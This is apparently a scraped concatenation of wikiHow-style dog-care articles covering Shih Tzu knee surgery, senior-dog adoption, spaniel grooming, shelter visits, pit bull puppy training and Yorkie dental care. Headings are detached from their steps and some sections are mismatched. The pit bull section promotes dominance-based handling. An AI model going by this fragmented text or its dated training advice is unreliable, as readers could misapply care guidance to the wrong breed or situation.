, You will need to also check your dog's nails once a week to see if they need clipping. Many active larger dogs are able to keep their nails short by wearing them down, but some aren’t able to or as they get older and less active they don’t wear as well.Do not to trim the quick.

Your vet will determine the grade of your Shih Tzu’s patellar luxation at the time of diagnosis. Grade 2 or higher luxation frequently requires surgical correction.In some cases, though, dogs with grade 2 or even grade 3 luxation may do just fine without surgery.Unless your Shih Tzu has severe patellar luxation that is causing pain and discomfort, deciding whether to perform surgery may not be clear cut. Talk with your vet to make the decision.;
, Several surgical treatments are available for patellar luxation. They each correct a structural problem contributing to the luxation. For example, if the patellar groove has become shallow, there is a procedure that can deepen it. If the patella has shifted to the inside of the knee, a surgical procedure can secure the patella on the outside of the knee.The main goal of patellar luxation surgery is to secure the patella in its proper position and prevent it from luxating again.To determine which surgery your Shih Tzu will need based, your vet will review the results of the orthopedic exam and x-rays that they performed to make the diagnosis.
Your Shih Tzu may need a combination of procedures to correct the luxation.Whichever procedure your vet recommends, they will need your approval before moving forward with surgical treatment.
The more severe the patellar luxation, the more complex the surgical correction will be., If your Shih Tzu needs surgery, do not delay in scheduling the procedure. Mild patellar luxation can become severe if left untreated. Also, the more often the patella luxates, the more it will wear down the patellar groove, which could increase your Shih Tzu’s lameness over time. Also, your Shih Tzu could develop early arthritis, which could lead to a permanently swollen knee.An untreated patellar luxation can also lead to injury of the anterior cruciate ligament, a structure that crisscrosses in the knee joint to connect the thigh bone and tibia (a bone in the lower leg).The earlier your vet performs the surgery, the better.

, After surgery, your vet will give you instructions on caring for your Shih Tzu at home. For example, you will need to limit your Shih Tzu’s physical activity for 2‒3 months after surgery.This may not be easy if your Shih Tzu is normally active and playful. Ideas for limiting physical activity are as follows:Do not allow your Shih Tzu to play with children or other pets.
Keep your Shih Tzu off of slippery floors, such as hardwood floor or tiles.
Put your Shih Tzu on a leash when you take it outside to go to the bathroom.

, Check your Shih Tzu’s incision site once a day for signs of infection (e.g., swelling, yellow liquid discharge).If the incision looks infected, take your Shih Tzu to your vet for treatment. An infected incision would need antibiotic treatment.


To ensure your Shih Tzu doesn't bother the incision, your vet will put an Elizabethan collar (e-collar) around your dog’s neck.This collar looks like a large plastic cone. Your Shih Tzu would need to wear it for at least a few days following surgery.
If your Shih Tzu doesn't wear the e-collar, it could scratch at the incision and break the skin, leading to a potential infection.

, Your Shih Tzu will probably be in some pain after surgery. Your vet will prescribe an oral anti-inflammatory medicine to reduce the pain.If your Shih Tzu doesn’t like taking pills, try hiding the pill in your dog’s food at mealtime or placing it in a small, chewy treat.


Follow the prescription instructions carefully. Even if your Shih Tzu doesn’t seem to be in pain, do not stop giving it the pain medication until your vet tells you to do so.

, Physical therapy is another important aspect of at-home care after surgery. If your Shih Tzu is not putting weight on its surgically-repaired knee after about a week, your vet will recommend various physical therapy exercises for you to perform on your dog. These exercises will increase the range of motion of the affected knee., Several weeks after surgery, your vet will want to see your Shih Tzu to re-examine its knee.During the follow up visit, your vet may want to take x-rays to get a close look at the patella and other leg bones.


If your vet inserted any implants during surgery, they will want to check the placement of the implants on an x-ray. Fortunately, it is very rare for implants to move or break following patellar luxation surgery., If your Shih Tzu does not need surgical correction of the patellar luxation, your vet will recommend non-surgical treatment strategies, such as anti-inflammatory medication.Even if your Shih Tzu’s knee is not painful, the luxation could still cause inflammation of the knee joint. This inflammation could get increasingly worse and eventually cause pain and discomfort in the knee.


Anti-inflammatory medications can cause digestive upset when given long term. They should not be given continually for the duration of a dog’s life.

, Chondroitin and glucosamine are substances that support joint health. Glucosamine repairs joint cartilage and chondroitin suppresses enzymes that break down this cartilage.You can purchase chondroitin and/or glucosamine supplements online, at a pet store, or through your vet.


Talk with your vet before adding any supplement to your Shih Tzu’s diet.

, Weight management is another important non-surgical treatment strategy.Keeping your Shih Tzu at a healthy weight will lessen the amount of pressure on its knees. Maintain the healthy weight by limiting treats and feeding no more than the recommended amount of commercial dog food.


Your vet can let you know your Shih Tzu’s ideal weight. If your Shih Tzu is overweight, your vet will devise a weight loss plan to help your Shih Tzu gradually lose weight.

, Since small breed dogs are so prone to patellar luxation, they should not engage in intense or rough physical activity. If your Shih Tzu has mild patellar luxation, limit its activity.For example, avoid activities like fetch that would encourage jumping. Instead of taking your Shih Tzu out for a long walk, consider taking a shorter walk around your neighborhood.


Since your Shih Tzu will not be very active, keep a close watch on its weight. It may start gaining weight because it is not burning a lot of calories through exercise.

You can easily get a sense of an senior dog’s temperament, which tends to be very stable., When you bring home a puppy, you are taking a gamble in terms of size, as you can never be 100% sure how big your dog will get. Senior dogs are finished growing, so you can witness their full size before you bring them home.This can be especially helpful if you have a small home or limited outdoor space.

, Although some people may not want to bring home a pet that will live less than 10 years, for other families, a pet with a slightly shorter lifespan may be ideal. If you’d rather not sign up for 15+ years of pet obligations, perhaps a senior dog is the right choice for you.If you'd rather not continue taking care of a dog after your kids have gone off to college, this could be the dog for you.

Understand that they have less stamina.,
Understand that they will need more veterinary visits.,
Request a health report from a veterinarian.",How to Know if a Senior Dog Is Right for Your Family3," The first major difference between a young a dog and an older dog is the amount of energy and stamina they have. Most senior dogs will not be able to play as intensely, or as long, as younger dogs of similar breeds. This can be a benefit for busy families, who don’t have the time to exercise a young dog.Dogs of any age still need physical and mental stimulation.
Playing fetch, going for a short jog, or playing hide-and-seek with a treat can help keep your dog happy and healthy.

, Senior dogs, even those that are very healthy, need to be seen by the vet more often. Senior dogs should visit a vet at least twice a year. This visit should include blood work, urine analysis, and a full body examination. Additionally, senior dogs should be seen annually for a dental cleaning and exam.A basic veterinary visit can range from $45-200. Additional ""geriatric"" screenings (such as blood work and chemistry, urinalysis, and x-rays) can run around $100.
Having your dog's teeth cleaned can cost anywhere from $300-500. If they need additional dental work, this will cost more.

, Most shelters and adoption centers will be able to provide you with a comprehensive health report for a dog you are interested in adopting. By reviewing this information, you will be able to decide if you can meet the animal’s needs. Many older dogs will have no significant health problems, some will have very manageable health problems, and some may have more serious health concerns."

Socialize your dog.",How to Care for English Springer Spaniels2," English Springer Spaniels are very affectionate dogs who make great companions and family dogs. They require a lot of attention and affection to be happy. Make sure to give your spaniel affection daily to keep her happy., English springer spaniels are extremely hyper dogs and need a lot of exercise. A 30 minute or more walk twice a day is a good starting point for exercise for this active breed. Eventually, two one-mile long walks a day should be good. She may need more exercise if he is particularly boisterous inside the house or acts squirrelly.You can also let your dog out into your fenced back yard to run around and play.
Spaniels also like to swim, so you can take them to a lake or let them swim in your pool.
Field springer spaniels will need more exercise than show springer spaniels.

, In addition to long walks, play games with your dog. A game of fetch or Frisbee or even chasing bubbles blown by you can be a fun, healthy way to bond with your English springer spaniel. This helps expend some of the energy the breed has and keeps your dog from being bored.


Regular exercise keeps your English springer spaniel physically healthy and also keeps her mind active to curb bad behavior stemming from boredom, such as destructive chewing, jumping or barking.

, Carefully introduce your English springer spaniel to people, other animals and dogs, and situations outside the immediate home environment. Take her for car rides, walks around the neighborhood, and to parks so she can meet new people, new animals, and experience a variety of sights and sounds.

Before you start brushing or bathing your dog, remove these items from your spaniel’s coat. This is important as these can get tangled in the fur creating mats, or break into smaller bits while you brush or bathe the dog, making it more difficult to remove.Taking a few moments to remove foreign objects trapped in fur each day can save you a lot of effort and energy in the long run.;
, These brushes have numerous wire bristles that pick through mats in your spaniel’s fur, and the bristles are set at an angle in order to avoid scratching your spaniel’s skin. Brush in the direction of the grain of the dog’s coat to get rid of tangles. Do not brush your dog's head or ears., If you find any large tangles, try to gently brush them out with your slicker brush. If this doesn’t work, massage baby oil into the mat and brush the area again. When this method is ineffective, you may have to resort to clipping the mat out of your pet’s fur. If you need to do this, use a pair of pet grooming scissors or baby scissors. Place the blade beneath the mat, but leave space between the mat and skin so you don't cut your pet. Carefully clip the matted hair and debris out of the coat., Once you’ve gotten all the tangles out, brush the hair on your dog's body, head, face, and ears. Move the brush with the grain of the dog’s coat to smooth it out. You should completely brush your dogs coat and remove tangles at lest once a week., This may seem easy enough, but there are several challenges involved in selecting your dog’s bath location. If you have a walk in shower, you may be able to bathe your spaniel inside the house. However, it’s much easier to bathe your dog with a hose that can move the water around. If you have a handheld showerhead, this could be the ideal pet washing station. Otherwise, you’ll probably want to bathe your dog using a hose outside.


Make sure your dog is standing on a clean, solid surface to avoid getting the dog’s feet and belly muddy as you wash them.
Children’s wading pools make a great dog bath!

, As long as your dog does not have mange, fleas, or mites, just about any cleaning agent will do. Many people use baby shampoo to clean their spaniels because it is typically a safer formula that will not burn their eyes. Talk to a representative at your local pet store, a dog groomer, or your veterinarian to get advice about specific shampoos that may be beneficial for your spaniel., Start by soaking your Sussex spaniel’s coat from the head back. Make sure it is complete saturated by applying water to each area of your dog’s body. Don’t forget to wet your dog’s belly. Then, apply a small amount of shampoo. Start with a quarter sized dollop, and add additional shampoo as needed to completely clean the coat. Spend some time massaging the shampoo into your dog’s coat to ensure you’re removing dirt and buildup from the roots.


Clean just the dog’s body first. Then, wash their head and face as this makes it easier to control water and soap that could get in their eyes, mouth, or nose. Always use tear free shampoos on your dog’s head., Shampoo left on the fur can irritate your spaniel’s skin, lead to flaking, or even be a health hazard if your dog licks it off. Make sure to thoroughly rinse your dog to avoid these concerns. Keep rinsing until the water running off your dog’s body is completely free from suds., You’ll need to do this following a bath before you start styling your spaniel’s coat. Start by toweling off your spaniel, and then follow up with a blow dry. There are dog grooming blow dryers available, but you can also use a blow dryer made for people. For a Sussex spaniel, you’ll need to take special care to avoid tangling the coat as you blow dry. Use your bristle brush to control the hair as you go.


Drying your dog is especially important in cold whether since your dog could become ill if its body temperature drops too low., You can buy special pet grooming scissors or use baby scissors to clip off excess fur from the tail, legs, paws, chest, sanitary areas, and around the eyes and ears. This grooming makes it easier to keep your spaniel clean and free from mats and tangles. It is a good idea to have someone the dog knows and trusts hold them while you’re clipping and trimming. This protects you and your spaniel from accidental injury., If you’re planning to show your dog competitively, you will not be able to clip any part of their fur except around the feet to create feathering, as this is the breed standard. You will also need to style their coat in a specific way. If you’ve never groomed a dog for a show, it’s a good idea to ask a professional groomer to assist you, or watch a professional groomer to learn how to properly groom your Sussex spaniel’s coat to meet the breed standard., Moisten a cotton or wool ball with mineral or olive oil and gently wipe the visible areas. Repeat on a fresh cotton ball for both ears. You can also purchase prescription or over the counter eardrops that will help you remove dirt and buildup inside your Sussex spaniel’s ears. Don’t clean any further than the areas you can see, and never use cotton swabs to clean you’re your dog’s ears as you may cause unintentional injury., Use a toothbrush and toothpaste specifically made for pet use. Apply a small amount of toothpaste to the brush. Gently lift your dog’s lips and brush each tooth on top and bottom. To keep your dog from ingesting the toothpaste, you can use a damp rag to wipe their teeth after brushing. You may also want to offer your Sussex spaniel dogs chews made to stop tartar build up on teeth.If your dog has never had their teeth brushed, slowly introduce them to the brush and get a toothpaste flavored like his favorite food. When brushing your dog's teeth, make no sudden movements and be gentle or your spaniel may try to snap at you.
If you don't want to clean your dog's teeth yourself, you can take them to a vet, who can clean them.
Do not give your dog chews as a substitute to cleaning teeth, as this can lead to a build up of tartar and plaque in your dog's mouth and other dental problems.

, This will keep dirt and other foreign matter from building up and protect your floors, furniture, and lap from the hazards of long dog nails. Sussex spaniels have notoriously fast growing, hard nails, so it’s important to regularly trim them. Overgrown nails can also crack, split, or break, which can be very painful for your dog. Using dog nail clippers or large, durable human nail clippers, remove just the very ends of your dog’s nails, so they don’t reach all the way to the ground.Avoid clipping nail to the quick, the vein that runs through the nail. This is the darker pink part of the nail on dogs with white nails.
For dogs with darkly colored nails, you will not be able to see the quick. Instead, trim away small sections of the nail checking between clips for a gray oval in the end of the nail. This is the bottom of the quick, and you should stop clipping at this point.
If you do cut the nail to the quick, have styptic powder on hand. This powder is used frequently for shaving nicks and cuts and can be purchased in most pharmacies. Apply the powder directly to the bleeding toenail, and it will stop bleeding almost immediately. Styptic powder also helps to numb the area."
"
Approach the dog indirectly.,
Ignore the dog.,
Get on the dog’s level.,
Do not extend your hand toward the dog.,
Use a calm voice when interacting with the dog.",How to Interact with a Dog Before Adopting It2," If you approach a dog you wish to interact with before adopting it directly, it might interpret the approach as threatening. Instead, approach the dog by sidling along the dog’s cage or housing unit so that only your side is exposed. In other words, the dog should see you in profile, rather than seeing you coming at it head-on.Approaching the dog you want to interact with before adopting it in this way will make it more disposed to approaching you in a friendly way.

, Once you’ve come close to the dog you want to interact with before adopting it, you should interact with the dog’s foster owner or handler only. Talk to the caretaker briefly about the dog’s personality and temperament, and ask any remaining questions you might have. You could request that the dog be let out of its cage to get a closer look at you.This will give the dog time to assess your personality and mannerisms., Once you’re near the dog you wish to interact with before adopting it, bend down on one knee. Do not look the dog in the eye.Instead, focus your gaze at a point to one side of the dog you want to adopt. This is especially important for smaller dogs who are more likely to feel threatened by a large new human.At this point, the dog will decide if it wants to approach you or not. If it does not, don’t take it personally. You could choose to meet another dog you want to interact with before adopting it, or schedule a follow-up meeting with the same dog. Perhaps the dog will be more friendly upon a second meeting.

, Some people think that they need to extend their hand to a dog they are interacting with so the dog can learn their scent. However, the dog can detect any human’s scent way before they approach close enough to extend their hand. In fact, extending your hand to a dog you’re interacting with before adopting it could result in the dog being scared and biting you. If the dog you interact with is comfortable, it will approach you. This indicates that it will allow you to pet it. Gently rub behind the dog's ears or on the back of its neck. Do not roughly slap it on its side.

, Do not use a high-pitched and excited voice when interacting with a dog before adopting it.Dogs perceive people who do this as weak and will be more likely to jump on you. They might also become agitated and scared, which could cause them to bite or growl out of fear."
"
Know what you want in a dog.,
Bring your family.,
Bring your dog.,
Ask plenty of questions.",How to Interact with a Dog Before Adopting It3," Before you adopt a dog, you should know what you’re looking for. Do you want a big dog? A small dog? Do you want a dog in prime health, or would you adopt a dog that – for instance – is blind or deaf? Establish your standards and expectations for the dog you want before interacting with a dog before adopting it.Monitor the dog’s behavior when you adopt it. If it is playful and energetic, ask yourself if this type of dog personality fits your lifestyle and/or your family’s lifestyle.
Having a concrete notion of what you want from a dog will help you avoid problems later if and when you actually adopt the dog.

, If you have kids, you should bring them along when interacting with a dog before adoption. If the kids react badly to the dog, or the dog reacts badly to the kids, or both, you may want to adopt another type of pet or forego introducing a pet into your household altogether. If you have a domestic partner, you should bring them along, too, and include them in the decision as to which dog your family will adopt.For instance, if your kid starts crying when it interacts with the dog, or if the dog puts its tail between its legs and starts howling when it meets the child, you should think twice about adopting it.
Kids under 6 years old generally do not mix well with pet dogs.If you have children, you might do best adopting a lab or beagle.

, If you have a dog at home already, you should bring it along when interacting with another dog before adopting it. The introduction of your new dog to the dog at the adoption center is not necessarily an indication of how they will behave over the long term. Most dogs who live in close proximity become friends eventually.If your current dog has behavioral issues (for instance, if it is very aggressive) it might be best to get a different pet like a fish or turtle that your dog will have minimal interaction with. An adopted dog might end up being bullied by your current dog.
It’s best to have your current dog for at least one year before introducing a second into your home.Adopt a dog that complements your current dog’s personality. For instance, if your dog is dominant or assertive, adopt a dog who is more submissive and wimpy. If your dog is anxious or shy, adopt a dog who is confident and playful.

, When you interact with a dog before adopting it, you’ll have many questions. Ask an employee of the shelter or humane society your questions about the dog, specifically, and the adoption process generally. They might not have all the answers, especially if the dog came in recently, but they should be able to help you with a few basic questions. For instance, you might want to know:Is this dog spayed/neutered?
Where did this dog come from? Was it donated or was it a stray?
What is the adoption fee?
Will I be required to attend any dog owning courses following the adoption?
What are the next steps I should take if I want to adopt this dog?

Ensure you have enough space for the dog.,
Think about whether you’ll have time for the dog.,
Be sure you’re ready for the commitment of dog ownership.Owning a dog is a huge investment of not only time, but money, as well.",How to Interact with a Dog Before Adopting It4," If you live in a small apartment, or you live in a housing situation which is already overflowing with people and other pets, it’s best to avoid introducing another animal into the mix. Dogs need space to play and move about, play, and feel safe. Like humans, dogs can get stressed and upset if they are cramped and feel they don’t have a space of their own.If you live in an apartment, you should ensure that your lease enables you to own a pet. The adoption agency will want to see proof that you can adopt in the form of a lease or a letter from your landlord.You might also be forced to pay an additional fee to your landlord before adopting.

, Dogs need to be fed, played with, let outside, and provided with opportunities to move about. If you and/or your family won’t be able to make time to provide for your dog’s needs, you should not adopt a dog., Pet food, toys, and vet visits can be expensive, and are an ongoing expense. If you’re not ready for these commitments – which will last 10-15 years over the course of the dog’s natural life – you should think twice before adopting a dog."

Give everyone time to adjust.",How to Interact with a Dog Before Adopting It5," Whether you adopt through an adoption event, a foster to adopt program, a shelter, or a humane society, you’ll need to complete some paperwork. The adoption application provides the dog’s current caretaker with information about you, including personal information (your name, address, and phone number) and a questionnaire that helps the caretaker determine if you’re a good candidate for a given animal. The questionnaire includes questions like:Have you owned dogs before?
Why do you want to adopt this dog?
Who will care for your pet when you’re away from home?
Will the animal live indoors most of the time?

, You should have a dog bowl, dog food, collars, leashes, and ID tags for your dog before bringing it home. You should also have a crate and/or dog bed, and some toys for your new dog to play with.The best water and food bowls will be made of ceramic since they’re heavy and slide about less easily than flimsy plastic and tin dog food bowls.

, Remove hazardous items that your dog might hurt itself on from your floor. For instance, pick up any scissors, knives, or nails that might be laying about. Talk to your family members or housemates about what they can do to ensure the newly-adopted dog feel comfortable and happy.Assign responsibilities to your family members regarding the dog, such as letting it out, playing with it, and walking it.
Set the dog’s food and water bowls, crate, and bed in their appropriate locations.

, If you have cats, other dogs, or other pets, ensure they are healthy and up-to-date on their vaccines and shots. This will ensure that your new, adopted dog does not contract any illnesses from the animals already living in your home., Before you pick up your adopted dog, decide where in the car you’re going to put it. If you put it in a crate while driving home, ensure you have enough space in your car to place the crate. If your newly adopted dog will going to its new home without a crate, ensure you bring someone along to help the dog so it doesn’t get scared or stressed during the car ride. Head straight home, without stopping en route.You might want to put your dog on a towel or two in case it gets sick or urinates.

, When your newly adopted dog is in its new home, it will need time to adjust. Give it a few days to get the lay of the land. You should start walking your dog around the block, but don’t take it for any long car trips or vacations just yet. Too many trips in a short time can be disorienting and stressful.Use this initial period to establish patterns regarding housetraining. Even dogs who were fostered and housetrained will need to learn the protocol regarding how to “ask” to go out in your home. Take your dog out regularly after it eats, before bed, and first thing in the morning until it knows where the door leading to it’s bathroom territory is.
Walks should last 5-10 minutes until you know more about your dog’s behavior.

, Both your newly adopted dog and your family will need time to adjust to the dog’s presence. Be patient and allow the bond between you/your family and your dog to develop.Adopted dogs, especially, might show aggressive tendencies for the first few days. It might also be shy or anxious. Give your dog time to adjust to you and your other family members.If your dog doesn’t seem to be adjusting well to you, your family, and its new home, think about investing in obedience lessons. Obedience lessons are often available at “puppy kindergartens” or “dog finishing schools.” To locate one in your area, ask your vet for a recommendation, or consult your yellow pages.

Determine if your puppy has been to the vet.,
Get a heartworm preventative.,
Spay or neuter your dog.",How to Care for English Springer Spaniels3," After adopting your dog, determine if the dog has been to the vet. The dog should have been taken to the vet at six weeks to check for any abnormalities and to be dewormed for the first time.If you adopt a young puppy, around eight to 10 weeks old, you probably need to take her to the vet to get additional deworming treatments and follow-up vaccinations, such as another distemper vaccine, Lyme disease vaccine, and a rabies vaccine.

, To protect your puppy, get a heartworm preventative from your vet. This can be started at eight weeks of age.


Heartworms can cause major medical issues, so starting her on treatment early will help prevent her from developing them., If you do not plan on breeding your English springer spaniel, then you should get her spayed (or neutered if a male).

, English springer spaniels can get a couple of different eye diseases. The most common is retinal dysplasia. They also can progressive retinal atrophy, cataracts, eyelid abnormalities, corneal dystrophy, and glaucoma., Because English springer spaniels have such long, floppy ears and long hair, they can get chronic ear infections.

Establish rules during playtime.",How to Train a Pitbull Puppy," Pit bulls can have wonderful temperaments if they are bred for this quality and not for fighting.


If the breeder tells you they train guard dogs, you may want to choose a breeder who breeds for family pets.
Find out if the breeder has a reputation for selling dogs with hip dysplasia or cataracts—2 common afflictions in pit bulls.Calling previous owners, reading reviews on the Internet and talking to your local animal shelters is important due diligence.;
, If you want your dog to socialize with animals as well as people, you should raise the puppy with those animals from the beginning.


If you separate other animals from the puppy, the dog may identify all other animals as prey and respond aggressively.

, Your dog will go through teething, playing, socializing and a lot of learning in the first few months of ownership.


Toys, both soft and hard allow the dog to bite inanimate objects when teeth are growing.
Failure to keep the toys stocked may result in biting behavior.

, Pit bulls require more exercise and play than many other breeds of dogs.


Failure to exercise dogs may make them bored, destructive and aggressive.

, A crate will make it easier to potty train your pit bull and help it feel at home in your house.


The crate can also be used for transportation.
If your dog is will travel frequently, you may want to use absorbent pads inside his crate. You can teach him to use the pads if he cannot go outside.
When your dog is trained to use his crate, you can travel with him much more easily.

, The first 16 weeks of the puppy’s life are the socialization period that determines much about what they learn about other animals and the outside world.


The first step in socialization is ensuring the puppy has adequate time with his mother. Ask your breeder if the mom had time to care for the puppy and discipline it.
The second step is socialization with littermates. Siblings teach each other about submission and dominance.
The third step in socialization is the breeder. This person is the first contact with humans. A gentle touch, good discipline and basic housebreaking will go a long way.
The fourth step is you as the owner. The socialization process between 7 and 16 weeks is even more important for pit bulls than other breeds of dog.

, Allow the puppy to become comfortable in your home. You can start teaching the puppy basic commands, like “stay” and “sit” and where to pee.
Pet your puppy frequently. Encourage everyone in the family and your friends to pet the puppy on the head, back and stomach.

, You will need to watch the puppy closely during housebreaking, but try to avoid keeping certain areas of the house off limits.


It’s better to allow your puppy to get used to different environments than to restrict him at this age.

, The more people who are introduced to him the better.


He will learn to view humans as non-threatening animals.

,


If possible, make these socialization periods in small parks or homes rather than in dog parks. Dog parks can be intimidating for small animals.

, In fact, the more diverse the experiences between 10 and 16 weeks old, the better.


Introduce the dog to the car, elevators, offices (where allowed), other homes, and parks.
As long as your dog is safe, the more experiences he has, the more adaptable he will be in the future.
Watch your dog carefully for parvovirus. Make sure the dog is vaccinated and that it does not spend a lot of time sitting or laying down in unsanitary conditions. , Brush him and bathe him regularly.


Pit bulls only need to be bathed every month or so, so make sure the first few baths are within the socialization period or they may not learn to stay still during bath time.

, This does not mean you should yell or hurt the dog, but rather show him that you are the boss of the relationship. Make sure other members of your family learn to be dominant as well.

, In packs, the submissive animal displays their belly to the dominant animal.


Repeat this each time the puppy is too aggressive or tries to be dominant with you.
When the puppy starts to show this behavior on his own, you know you are on the right track.

, Don’t yell aggressively.

, Try “Down,” “Off” and “Back” instead of a general “No.”


Pit bulls are smart and can learn a lot of commands. Try to be specific with your training words.

, Make sure your entire family understands that the dog should stay off tables and furniture.


Practice with friends and family so your pit bull understands the boundaries and who is boss.

,,


If the dog must learn to pee inside, use special disposable training pads. Absorbent pads set in the same place each time is a good “last resort” for the dog if you cannot get home in time to take him outside.

, Establish boundaries for where the dog can pee, such as on grass.

, If they make a mess, communicate clearly and firmly without harsh punishment. Take the dog to the area in which he can pee.

, Use it regularly to avoid confusion.

,,


Pit bulls grow up to be extremely strong. It will be very difficult to control a leash-pulling pit bull at full strength, if you don’t teach them when they are young.

, If possible, find “puzzle toys” that encourage the dog to solve a puzzle to get a treat. , Try to teach your puppy a new trick each week. Reward the puppy with treats to encourage repeat behavior.


Limit the training period to approximately 5 minutes at a time each day. Focused training time will work better than infrequent long periods of training.

, Free exercise compliments mental exercise.


Find a yard or a fenced park.
Avoid no-leash dog parks until your dog is older than 16 weeks old.

, Do not teach your dog to chew on you during play.


Some experts recommend yelping if you receive a bite and stopping playtime abruptly. The dog will learn that biting stops playtime.
Wait 10 to 20 minutes before resuming playtime.
Redirect biting with toys before your dog tries nipping at you. If you see your dog is biting, it could be teething and need a toy to help break in new teeth. "

,  Using a regular scale may not work, since a Yorkie is so small, Get the right tools for the job.


You can do this at the vet's office. This idea is good, because there your vet will tell you if the dog is overweight or underweight and what to do about that. Also, the vet will usually have the proper tools for the job.

, You can do this on a table or counter-top since the dog is so small and that would probably be easier for you.

, To do this you will need to know the average weight for the dog.


Average size- Height= 8–9 inches (20.3–22.9 cm)   Weight=4-7 pounds
Overweight Yorkies can be around 10 pounds or more.
If the dog is overweight monitor its diet or exercise it more.

, And always compare to average weights, a dog the size of a Yorkie could lose weight fast.

Spend several weeks to get your Yorkie accustomed to having you manipulate her mouth.,
Start by rubbing your Yorkie’s teeth and gums with your fingers.,
Practice opening your dog’s mouth.,
Begin by simply lifting up your dog’s lips to expose her teeth.,
Move on to opening your Yorkie’s mouth.,
Increase the amount of time you can hold your Yorkie’s mouth open and keep your finger along her teeth and gums.,
Brush your Yorkie’s teeth once a day.,
Choose the right toothbrush.,
Slowly introduce the toothbrush and toothpaste to your dog.,
Start brushing with your dog’s mouth open.,
Alternate cleaning your dog’s inner and outer teeth surfaces.,
Reward your Yorkie after brushing.,
Feed your dog hard rather than soft foods.,
Give your dog teeth-cleaning treats.,
Do not feed your Yorkie table scraps.,
Provide your dog with some chew toys.,
Bring your Yorkie to a veterinary dentist once a year.,
Know the signs of dental problems.",How to Keep Your Yorkie's Teeth Clean," The key to successfully brushing your Yorkie’s teeth is to take it in stages. Start slowly, using only your fingers at first., This stage should take 2-3 days. The key is to mimic what will happen when you brush your dog’s teeth. Lift her lips to make sure you get at all of her teeth.Dip your finger in something your dog likes. Chicken broth, peanut butter, and marinara sauce tend to be popular.
Rub your finger along your Yorkie’s teeth and gums while she licks your fingers.
After the first day, start occasionally dipping your finger in your dog’s toothpaste. Some popular flavors include poultry, beef, and liver. Make sure she likes it. If she has no interest in licking it, then you might want to try another flavor.
You should never use human toothpaste to brush your Yorkie's teeth. Human toothpaste contains fluoride which is toxic to dogs., To effectively clean your Yorkie’s teeth, you’ll need to be able to open her mouth and work inside it without her squirming or biting you. This takes practice. And delicious treats. You want her to have positive associations with mouth manipulation, so be sure to have a treat she likes on hand, like cheese or hot dogs.If your dog squirms, jerks her head, or tries to escape during the following exercises, gently but firmly hold her muzzle until she stops. When she does, wait a second and release her muzzle.
Her struggling may be a sign you are moving to fast. Go back to the previous step for a few days.

, The key here is to move slowly. You’ll be brushing your Yorkie’s teeth for years. Don’t worry about taking 3 to 5 weeks to get it right at the start.


Put one hand under your dog’s chin and the other on top of her muzzle as if you were about to open her mouth. Instead, release her and give a special treat. Repeat 8-10 times per session, a couple of times a day, for 2-3 days.
With your hands in the same position, this time lift your Yorkie’s upper lips for 2 seconds to expose her teeth. Release, praise, and treat. Do this 8-10 times per session, three or more times a day, for 2-3 days.
Gradually extend the time you lift your Yorkie’s lips. Over a week, move from 3 seconds, to 5 the next day, then 8, and so forth. When you can hold your dog’s lips up for 10 seconds, move to the next step.

, Again, move slowly, starting by opening your dog’s mouth just a little, then opening it wider and longer on successive days.With your hands under your dog’s bottom jaw and over the top of her muzzle, open your dog’s mouth about an inch, touch your finger inside her mouth, release, and treat. Repeat 8-10 times.
Practice this 3 times a day for 1-2 days. In successive sessions, practice open your dog’s mouth a little wider each time until you can see your dog’s back teeth.
Warning: Do not open your dog’s mouth too wide, as this can cause pain.

, Practice 8-10 times per session, with three sessions a day, for 5-7 days. Try to add a second each session, but don’t push it. If your dog struggles, go back to a step she is comfortable with.When you can hold your Yorkie’s mouth open for 10 seconds, you are ready to start brushing.

, Regularly brushing your Yorkie’s teeth is the most important and effective way to keep her teeth clean and minimize the chance of gum disease. It also helps to keep her breath fresh and prevent plaque from developing into tartar. Aim to brush your dog’s teeth once a day, and definitely brush the at least twice a week., When first starting, a finger toothbrush is generally better accepted by Yorkies. After a week or so with the finger brush, you should switch to a three-sided, small breed toothbrush.There are certain doggy toothbrushes specially designed for small breeds. Some even have adjustable handles that allow you to reach awkward places more easily. These are available at good pet supply stores.
You can use dental wipes if your dog has a hard time with a toothbrush. You can purchase disposable wipes at your local pet store.
Do not use a human toothbrush for your Yorkie’s teeth. Human toothbrushes are too hard and will irritate your dog's gums.

, Place a small amount of toothpaste on the doggy toothbrush. Then place one hand over the top of your Yorkie’s muzzle to lift her lips. Using your other hand, gently brush the outer surfaces of a few teeth with a circular motion. Stop after 2-3 seconds and reward with a treat.Do this 2-3 times a day for 1-2 weeks. Slowly increase the time you spend brushing: 3 seconds, then 5, 8, 10, and so on.
Keep increasing the time until you can brush the outer surfaces of all your Yorkie’s teeth.

, Now that you can brush the outer surfaces of your Yorkie’s teeth, it’s time to tackle the inner parts. That means opening your dog’s mouth. Place one hand over your Yorkie’s muzzle and gently open her mouth, as you have practiced. Brush just a few teeth for 2-3 seconds, release, praise, and treat. Repeat this 3-5 times per session.Practice twice a day for 3-5 days, gradually increasing the amount of time you keep your dog’s mouth open to 5 seconds.
Also increase the number of times you clean per session until you can clean the inner surfaces of all your dog’s teeth in one session.

, Brush daily in short sessions of 5 minutes. Do the outer teeth one day and the inner the next.

, Play with her or give her a treat to make sure she continues to look forward to tooth brushing., Feeding your Yorkie hard kibble instead of canned dog food can significantly reduce the formation of tartar and plaque on your dog teeth.All dry kibble is preferable to wet foot, but consult the Veterinary Oral Health Council website for types of dry food that are specifically designed to reduce plaque and tartar.

, The Veterinary Oral Health Council website lists a variety of treats that can help to remove tartar and plaque from your Yorkie’s teeth.

, Human food, which is often high in sugar, is particularly bad for your dog’s teeth., Chewing on toys such as rawhide, pigs ears, bones, and Nylabones helps to reduce the plaque on your Yorkie’s teeth, while also keeping her entertained.Please keep in mind that you'll need to monitor your pet carefully when they are playing with a new toy, to prevent accidental choking.

, It is recommended that you bring your Yorkie for a dental check up at least once a year with a professional veterinary dentist. The vet will scrape away any tartar that your brushing has not removed. If you wish to learn how to scrape your dog’s teeth yourself, ask your vet to demonstrate.

, If your Yorkie has developed tooth decay, periodontal disease, or another serious dental issue, you’ll want to take her to the vet as soon as possible. Watch for:Loose teeth
Bad breath
Excessive drooling
Inflamed gums
Bleeding gums
Loss of appetite
Tumors in the gums
Cysts under the tongue

Take your dog on longer, more frequent walks.,
Play games with your dog.,
Take your dog to play dates.",How to Live With a Hyper Jack Russell Terrier1," Especially if your Jack Russell Terrier’s main form of exercise is a daily walk, it needs to be long and challenging. Your Jack Russell needs at least 30-45 minutes of vigorous exercise each day, so make sure that you’re walking your dog at least that much.If you’re able, walking your dog twice a day or for an hour or longer is even better.
